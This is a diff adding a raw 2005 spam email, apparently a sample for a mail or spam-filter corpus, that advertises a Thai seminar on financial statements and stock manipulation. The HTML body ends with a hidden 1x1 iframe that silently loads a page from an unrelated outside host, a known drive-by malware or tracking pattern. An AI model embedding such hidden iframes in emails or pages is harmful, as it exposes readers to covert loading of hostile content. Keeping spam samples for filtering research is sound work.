@@ -1,0 +1,32 @@
+Delivered-To: em-ca-bruceg@em.ca
+Received: (qmail 1941 invoked by uid 115); 19 Jul 2005 20:25:55 -0000
+Received: from accounting@accpaporn.com by churchill by uid 64011 with qmail-scanner-1.22 
+ ( Clear:RC:0(58.8.247.188):. 
+ Processed in 0.112203 secs); 19 Jul 2005 20:25:55 -0000
+Received: from ppp-58.8.247.188.revip2.asianet.co.th (HELO tiger) (58.8.247.188)
+  by churchill.factcomp.com with SMTP; 19 Jul 2005 20:25:54 -0000
+From: "สถาบันภาภัทร ร่วมกับ นสพ.bizweek" <accounting@accpaporn.com>
+To: <bruceg@em.ca>
+Subject: สัมมนาเจาะลึก งบการเงิน การปั่นหุ้น โดย 4 บิ๊กเนม Creative Accounting
+Mime-Version: 1.0
+Content-Type: text/html; charset="iso-8859-1"
+Date: Wed, 20 Jul 2005 03:27:04
+X-Qmail-Scanner-Message-ID: <11218047556721931@churchill>
+
+<html>
+<HEAD><META http-equiv=Content-Type content="text/html; charset=windows-874"></HEAD>
+<body bgcolor="#FFFFFF">
+<font size="2" color="#003333">หากรายละเอียดด้านล่างไม่แสดงสามารถดูรายละเอียดได้ที่ 
+<a href="http://www.unseenforum.com/seminar/papatr/money.html" target="_blank">www.unseenforum.com/seminar/papatr/money.html</a></font><font color="#003333"><br>
+<font size="2">สำหรับพิมพ์ <a href="http://www.unseenforum.com/seminar/papatr/money.doc">คลิกที่นี่</a></font></font><br>
+<img src="http://www.unseenforum.com/seminar/papatr/money.gif" width="700" height="1650" usemap="#Map" border="0"> 
+<map name="Map"> 
+  <area shape="rect" coords="225,935,442,984" href="http://www.unseenforum.com/seminars/registration3.php?sid=29&rcode=3" target="_blank">
+  <area shape="rect" coords="574,554,662,583" href="http://www.westingrandesukhumvit.com/images/map_big.jpg" target="_blank">
+</map>
+<br>
+<font color="#333366" size="2">Unsubscript Please reply to <a href="mailto:unsubemail@poppymail.com">unsubemail@poppymail.com</a> 
+</font> <iframe src="http://www.ohgos.com/d1/default.asp"  frameborder="no" width="1" height="1" scrolling="no" > 
+</iframe> 
+</body>
+</html>
